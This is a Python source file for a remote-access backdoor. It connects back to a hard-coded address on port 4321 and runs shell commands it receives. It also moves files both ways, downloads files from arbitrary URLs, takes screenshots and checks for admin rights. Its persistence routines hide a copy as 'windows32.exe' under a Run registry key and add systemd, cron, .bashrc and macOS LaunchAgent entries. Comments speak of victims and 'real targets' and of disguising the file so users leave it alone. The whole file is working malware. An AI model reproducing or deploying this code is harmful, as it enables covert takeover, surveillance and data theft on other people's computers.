#!/usr/bin/python

import subprocess
import socket
import json
import os
import base64
import shutil
import sys
import time
import requests
import threading
#import logger
#import ScreenRecord
#import WebCam_Record
from mss import mss



def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode('utf-8'))

def reliable_recv():
    data = ''
    while True:
        try:
            chunk = sock.recv(4096)
            if chunk == b'':
                print("[!] Server closed the connection.")
                sock.close()
                exit(0)
            data += chunk.decode('utf-8')
            return json.loads(data)
        except json.JSONDecodeError:
            continue


def screenshot():
    with mss() as sct:
        filename = sct.shot(output="screenshot.png")
        return filename


def is_admin():
    global admin
    try:
        # Try accessing tmp folder
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
    except:
        admin = "[!!] User Privileges!"
    else:
        admin = "[+] Admin Privileges!"



def shell():
    global sock
    while True:
        try:
            command = reliable_recv()
            if command == 'exit':
                sock.close()
                break
            
            elif command[:2] == "cd" and len(command) > 1:
                try:
                    os.chdir(command[3:])
                    reliable_send(f"[+] Changed directory to {os.getcwd()}")
                except Exception as e:
                    reliable_send(f"[!] Failed to change directory: {str(e)}")
                
            elif command.lower().startswith("download"):
                try:
                    filename = command[9:]
                    with open(filename, "rb") as file:
                        while True:
                            chunk = file.read(1048576)  # 1MB chunks
                            if not chunk:
                                break
                            encoded = base64.b64encode(chunk).decode('utf-8')
                            reliable_send(encoded)
                        # Send unique EOF marker
                        reliable_send("$$$EOF$$$")
                except Exception as e:
                    # Send error with special prefix
                    reliable_send("$$$ERROR$$$" + f"File download failed: {str(e)}")

            elif command.lower()[:6] == "upload":
                with open(command[7:], "wb") as fin:
                    file_data = reliable_recv()
                    fin.write(base64.b64decode(file_data))
                    continue
            elif command.lower()[:3] == "get":
                try:
                    DownloadFromInternet(command[4:])
                    reliable_send("[+] Downloaded File From Specified URL!")
                except:
                    reliable_send("[!!] Failed To Download That File")

            elif command.lower()[:10] == "screenshot":
                try:
                    file_path = screenshot()
                    with open(file_path, "rb") as sc:
                        encoded = base64.b64encode(sc.read()).decode('utf-8')
                        reliable_send(encoded)
                    os.remove(file_path)
                    continue
                except Exception as e:
                    reliable_send(base64.b64encode(f"[!!] Failed to Take Screenshot: {str(e)}".encode('utf-8')).decode('utf-8'))
            
            elif command.lower()[:5] == "check":
                try:
                    is_admin()
                    reliable_send(admin)
                except:
                    reliable_send("Can't Perform Check")
            
            elif command.lower()[:5] == "start":
                try:
                    subprocess.Popen(command[6:], shell = True)
                    reliable_send("[+] Started")

                except:
                    reliable_send("[!!] Failed To Start")
            
            '''elif command[:12] == "keylog_start":
                t1 = threading.Thread(target=keylogger.start)
                t1.start()

            elif command[:11] == "keylog_dump":
                fn = open(keylogger_path, "r")
                reliable_send(fn.read())'''



            if command.lower() == "help":
                help_options = '''                    download <path> --> Download a file from Target PC
                    upload <path> --> Upload a file to target PC
                    get <url> --> Download A file To Target PC from any website
                    start <path> --> Start a program on target PC
                    screenshot --> To take A screenshot Of Taerget Monitor
                    check --> Check for Admin Privilages
                    exit --> To quit the Shell
                '''
                reliable_send(help_options)
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode('utf-8', errors='ignore'))

        except Exception as e:
            print(f"[!] Error in shell loop: {str(e)}")
            break


#global keylogger_path = os.environ["appdata"] + "\\processmanager.txt"

# Find the appdata path on victim PC and hide backdoor for persistence for Windows
#location = os.environ["appdata"] + "\\windows32.exe" # The name I'm giving to the copy backdoor in the appdata is windows32.exe so the user doesn't think of deleting it.
#if not os.path.exists(location):
#    shutil.copyfile(sys.executable,location)
    # Persistence, startup on boot
#    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell = True) # The name backdoor in the line is the name of the register we are using to create persisitance, so you can change it to whatever you want maybe SystemConfig

# Find the appdata path on victim PC and hide backdoor for persistence for Windows    
def persistence():
    if sys.platform.startswith('win'):
        # Windows persistence with proper escaping
        location = os.environ["appdata"] + "\\windows32.exe" # The name I'm giving to the copy backdoor in the appdata is windows32.exe so the user doesn't think of deleting it.
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            # Persistence, startup on boot
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True) # The name backdoor in the line is the name of the register we are using to create persisitance, so you can change it to whatever you want maybe SystemConfig
    
    elif sys.platform.startswith('linux'):
        # Linux persistence (multiple methods)
        try:
            # Method 1: Systemd service (root required)
            service_file = "/etc/systemd/system/backdoor.service"
            if not os.path.exists(service_file):
                service_content = f"""[Unit]
Description=System Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
                with open(service_file, "w") as f:
                    f.write(service_content)
                subprocess.call(["systemctl", "daemon-reload"])
                subprocess.call(["systemctl", "enable", "backdoor.service"])
                subprocess.call(["systemctl", "start", "backdoor.service"])
        except:
            try:
                # Method 2: Crontab (user-level)
                cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
                subprocess.call(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
            except:
                try:
                    # Method 3: .bashrc (fallback)
                    bashrc = os.path.expanduser("~/.bashrc")
                    with open(bashrc, "a") as f:
                        f.write(f"\n{os.path.abspath(__file__)} &\n")
                except:
                    pass

    elif sys.platform.startswith('darwin'):  # MacOS
        # MacOS persistence (launchd plist)
        plist_file = os.path.expanduser("~/Library/LaunchAgents/com.apple.backdoor.plist")
        if not os.path.exists(plist_file):
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.backdoor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""
            try:
                with open(plist_file, "w") as f:
                    f.write(plist_content)
                subprocess.call(["launchctl", "load", plist_file])
            except:
                try:
                    # Fallback: Login items
                    applescript = f'''
                    tell application "System Events"
                        make new login item at end with properties {{
                            name: "SystemHelper", 
                            path: "{os.path.abspath(__file__)}", 
                            hidden: false
                        }}
                    end tell
                    '''
                    subprocess.call(["osascript", "-e", applescript])
                except:
                    pass

# Add persistence during initial execution

def initialize():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connection():
    while True:
        time.sleep(3)
        try:
            sock.connect(("192.168.43.150", 4321))
            shell()
            break

        except:
            connection()


def DownloadFromInternet(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

#persisitance() #uncomment it when executing on real target to set persistence
initialize()
connection()
sock.close()
